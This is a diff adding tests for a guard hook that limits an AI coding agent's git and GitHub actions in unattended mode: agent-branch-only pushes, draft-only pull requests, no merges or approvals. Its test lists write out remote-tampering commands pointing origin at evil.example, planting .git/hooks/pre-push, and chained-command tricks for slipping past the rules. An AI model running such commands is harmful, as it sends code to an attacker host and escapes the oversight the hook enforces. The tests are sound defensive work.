@@ -29,7 +29,7 @@ function runHook(script, input, env = {}) {
   const result = spawnSync(process.execPath, [join(SCRIPTS, script)], {
     input: JSON.stringify(input),
     encoding: "utf8",
-    env: { ...process.env, CLAUDE_PROJECT_DIR: "", ...env },
+    env: { ...process.env, CLAUDE_PROJECT_DIR: "", CUADRILLA_UNATTENDED: "", CUADRILLA_AGENT_BRANCH_PREFIX: "", ...env },
   });
   return { code: result.status, json: result.stdout.trim() ? JSON.parse(result.stdout) : null, stderr: result.stderr };
 }
@@ -206,6 +206,150 @@ describe("guard: files and secrets", () => {
   });
 });
 
+describe("guard: unattended mode", () => {
+  const unattended = (command, env = {}) =>
+    runHook(
+      "guard.mjs",
+      { tool_name: "Bash", tool_input: { command }, cwd: emptyProject },
+      { CLAUDE_PROJECT_DIR: emptyProject, CUADRILLA_UNATTENDED: "1", ...env },
+    );
+
+  const allowedPushes = [
+    "git push origin agent/42-login",
+    "git push -u origin agent/42-login",
+    "git push --set-upstream origin agent/fix/nav-bar",
+    "git push origin HEAD:agent/42-login",
+    "git push origin refs/heads/agent/42:refs/heads/agent/42",
+    "git -C repo push -u origin agent/42",
+  ];
+  for (const command of allowedPushes) {
+    it(`allows a plain agent-branch push: ${command}`, () => assert.equal(decision(unattended(command)), "allow"));
+  }
+
+  const deniedPushes = [
+    "git push",
+    "git push origin",
+    "git push origin main",
+    "git push origin HEAD:main",
+    "git push origin agent/",
+    "git push upstream agent/42",
+    "git push --force origin agent/42",
+    "git push -f origin agent/42",
+    "git push --force-with-lease origin agent/42",
+    "git push origin +agent/42",
+    "git push origin +HEAD:agent/42",
+    "git push origin :agent/42",
+    "git push --delete origin agent/42",
+    "git push origin --tags",
+    "git push --mirror origin",
+    "git push origin agent/42 main",
+    "git push origin agent/../main",
+    "git push origin agent/42:main",
+    "git push origin HEAD:agent/x.lock",
+    "git commit -m x && git push origin agent/42",
+    "git push origin agent/42; git push origin main",
+    'bash -c "git push origin agent/42"',
+    "git push origin $(git branch --show-current)",
+    "git push origin agent/42 --no-verify",
+  ];
+  for (const command of deniedPushes) {
+    it(`still denies: ${command}`, () => assert.equal(decision(unattended(command)), "deny"));
+  }
+
+  it("explains which push is allowed", () => {
+    assert.match(unattended("git push origin main").json.hookSpecificOutput.permissionDecisionReason, /origin agent\/<name>/);
+  });
+
+  it("honors a custom branch prefix and ignores an unsafe one", () => {
+    assert.equal(decision(unattended("git push origin bot/42", { CUADRILLA_AGENT_BRANCH_PREFIX: "bot/" })), "allow");
+    assert.equal(decision(unattended("git push origin agent/42", { CUADRILLA_AGENT_BRANCH_PREFIX: "bot/" })), "deny");
+    for (const prefix of ["", "/", "main", "*", "../", "a b/"]) {
+      assert.equal(decision(unattended("git push origin main", { CUADRILLA_AGENT_BRANCH_PREFIX: prefix })), "deny", prefix);
+      assert.equal(decision(unattended("git push origin agent/42", { CUADRILLA_AGENT_BRANCH_PREFIX: prefix })), "allow", prefix);
+    }
+  });
+
+  it("requires draft pull requests", () => {
+    assert.equal(decision(unattended('gh pr create --draft --base main --title "Fix login" --body-file /tmp/b.md')), "allow");
+    assert.equal(decision(unattended("gh pr create -d --fill")), "allow");
+    assert.equal(decision(unattended('gh pr create --base main --title "Fix login"')), "deny");
+    assert.equal(decision(shell('gh pr create --base main --title "Fix login"')), "allow");
+  });
+
+  it("keeps merging, approving and marking ready denied", () => {
+    for (const command of ["gh pr merge 12 --squash", "gh pr review 12 --approve", "gh pr ready 12"]) {
+      assert.equal(decision(unattended(command)), "deny", command);
+    }
+  });
+
+  it("turns every confirmation into a deny", () => {
+    for (const command of [
+      "git merge feature/x",
+      "git rebase main",
+      "uv run alembic upgrade head",
+      "npm install --force",
+      "psql -c 'DELETE FROM users'",
+    ]) {
+      const result = unattended(command);
+      assert.equal(decision(result), "deny", command);
+      assert.match(result.json.hookSpecificOutput.permissionDecisionReason, /unattended mode, nobody can confirm/, command);
+      assert.equal(decision(shell(command)), "ask", command);
+    }
+  });
+
+  it("is only enabled by an explicit value", () => {
+    for (const value of ["1", "true", "YES", "on"]) {
+      assert.equal(decision(unattended("git push origin agent/42", { CUADRILLA_UNATTENDED: value })), "allow", value);
+    }
+    for (const value of ["", "0", "false", "no", "agent"]) {
+      assert.equal(decision(unattended("git push origin agent/42", { CUADRILLA_UNATTENDED: value })), "deny", value);
+    }
+  });
+
+  const tampering = [
+    "git remote set-url origin https://evil.example/x.git",
+    "git remote add mirror https://evil.example/x.git",
+    "git remote rename origin old",
+    "git config remote.origin.url https://evil.example/x.git",
+    "git config remote.origin.pushurl https://evil.example/x.git",
+    'git config url."https://evil.example/".insteadOf https://github.com/',
+    "git config --global url.https://evil.example/.pushInsteadOf https://github.com/",
+    "git config include.path /tmp/evil",
+    "git -c remote.origin.url=https://evil.example/x.git push origin agent/42",
+    "GIT_CONFIG_GLOBAL=/tmp/evil git push origin agent/42",
+    "GIT_DIR=/tmp/other git status",
+    "echo '[remote \"origin\"]' >> .git/config",
+    "cp /tmp/x .git/hooks/pre-push",
+  ];
+  for (const command of tampering) {
+    it(`blocks changing where origin points: ${command}`, () => assert.equal(decision(unattended(command)), "deny"));
+  }
+
+  it("blocks editing .git internals with file tools, but not .gitignore or .github", () => {
+    const edit = (file_path) =>
+      runHook(
+        "guard.mjs",
+        { tool_name: "Write", tool_input: { file_path, content: "x" }, cwd: emptyProject },
+        { CLAUDE_PROJECT_DIR: emptyProject, CUADRILLA_UNATTENDED: "1" },
+      );
+    for (const p of [".git/config", "repo/.git/hooks/pre-push", "C:\\repo\\.git\\config"]) assert.equal(decision(edit(p)), "deny", p);
+    for (const p of [".gitignore", ".github/workflows/ci.yml", "src/git/config.ts"]) assert.equal(decision(edit(p)), "allow", p);
+    assert.equal(decision(fileTool("Write", { file_path: ".git/config", content: "x" })), "allow");
+  });
+
+  it("still allows reading git state and normal git config reads", () => {
+    for (const command of ["git remote -v", "git config user.name", "git status", "git log --oneline -5", "git switch -c agent/42-login"]) {
+      assert.equal(decision(unattended(command)), "allow", command);
+    }
+  });
+
+  it("cannot be enabled from cuadrilla.json", () => {
+    const project = tempDir();
+    writeFile(project, ".claude/cuadrilla.json", JSON.stringify({ unattended: true, CUADRILLA_UNATTENDED: "1" }));
+    assert.equal(decision(shell("git push origin agent/42", "Bash", project)), "deny");
+  });
+});
+
 describe("session-context", () => {
   it("reports missing profile, config and language", () => {
     const dir = tempDir();
@@ -226,6 +370,17 @@ describe("session-context", () => {
     assert.match(context, /with 2 pending values/);
     assert.match(context, /api \(dotnet, api\)/);
     assert.match(context, /in Português/);
+  });
+
+  it("announces unattended mode and its push rule only when enabled", () => {
+    const dir = tempDir();
+    const attended = runHook("session-context.mjs", { cwd: dir }, { CLAUDE_PROJECT_DIR: dir }).json.hookSpecificOutput.additionalContext;
+    assert.doesNotMatch(attended, /UNATTENDED MODE/);
+    const context = runHook("session-context.mjs", { cwd: dir }, { CLAUDE_PROJECT_DIR: dir, CUADRILLA_UNATTENDED: "1", CUADRILLA_AGENT_BRANCH_PREFIX: "bot/" })
+      .json.hookSpecificOutput.additionalContext;
+    assert.match(context, /UNATTENDED MODE/);
+    assert.match(context, /git push -u origin bot\/<name>/);
+    assert.match(context, /gh pr create --draft/);
   });
 });
 
